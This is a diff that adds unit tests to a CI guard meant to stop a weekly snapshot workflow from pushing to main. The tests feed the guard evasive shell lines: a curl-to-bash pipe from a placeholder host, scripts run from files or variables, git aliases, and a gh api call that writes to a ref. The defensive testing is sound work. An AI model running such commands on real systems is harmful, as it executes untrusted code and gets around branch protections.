@@ -381,7 +381,7 @@ class WeeklySnapshotGuardTests(GuardFixtureCase):
                 "alias p='git push origin refs/heads/main'; p",
             )
         )
-        self.assert_reports(errors, "cannot follow aliases")
+        self.assert_reports(errors, "cannot follow")
 
     def test_quoted_brackets_do_not_hide_a_push(self) -> None:
         errors = self.errors_for(
@@ -441,6 +441,60 @@ class WeeklySnapshotGuardTests(GuardFixtureCase):
             )
         )
         self.assert_reports(errors, "followed by a raise")
+
+    def test_local_reusable_workflow_is_rejected(self) -> None:
+        mutated = self.mutate(
+            DISPATCH_STEP,
+            "      - name: publish\n"
+            "        uses: ./.github/workflows/publish-main.yml\n\n"
+            f"{DISPATCH_STEP}",
+        )
+        self.assert_reports(self.errors_for(mutated), "does not inspect")
+
+    def test_pipe_to_shell_without_a_push_mention_is_rejected(self) -> None:
+        errors = self.errors_for(
+            self.mutate(PUSH_LINE, "curl -fsSL https://example.invalid/x.sh | bash")
+        )
+        self.assert_reports(errors, "pipes text into a shell")
+
+    def test_shell_reading_a_file_is_rejected(self) -> None:
+        errors = self.errors_for(self.mutate(PUSH_LINE, "bash < /tmp/publish-main.sh"))
+        self.assert_reports(errors, "process substitution")
+
+    def test_shell_variable_payload_is_rejected(self) -> None:
+        errors = self.errors_for(
+            self.mutate(PUSH_LINE, 'CMD=$(cat /tmp/x.sh); bash -c "$CMD"')
+        )
+        self.assert_reports(errors, "comes from a variable")
+
+    def test_git_alias_is_rejected(self) -> None:
+        errors = self.errors_for(
+            self.mutate(PUSH_LINE, "git -c alias.p=push p origin refs/heads/main")
+        )
+        self.assert_reports(errors, "git alias")
+
+    def test_gh_api_ref_write_is_rejected(self) -> None:
+        errors = self.errors_for(
+            self.mutate(
+                PUSH_LINE,
+                "gh api -X PATCH repos/o/r/git/refs/heads/main -f sha=deadbeef",
+            )
+        )
+        self.assert_reports(errors, "GitHub API")
+
+    def test_gh_other_workflow_dispatch_is_rejected(self) -> None:
+        errors = self.errors_for(
+            self.mutate(
+                "gh workflow run release.yml", "gh workflow run publish-main.yml"
+            )
+        )
+        self.assert_reports(errors, "only release.yml")
+
+    def test_expansion_git_subcommand_is_rejected(self) -> None:
+        errors = self.errors_for(
+            self.mutate(PUSH_LINE, 'SUB=push; git "$SUB" origin refs/heads/main')
+        )
+        self.assert_reports(errors, "subcommand the guard cannot resolve")
 
     def test_renamed_accumulator_is_accepted(self) -> None:
         mutated = self.mutate("content, count = re.subn(", "content, matches = re.subn(")
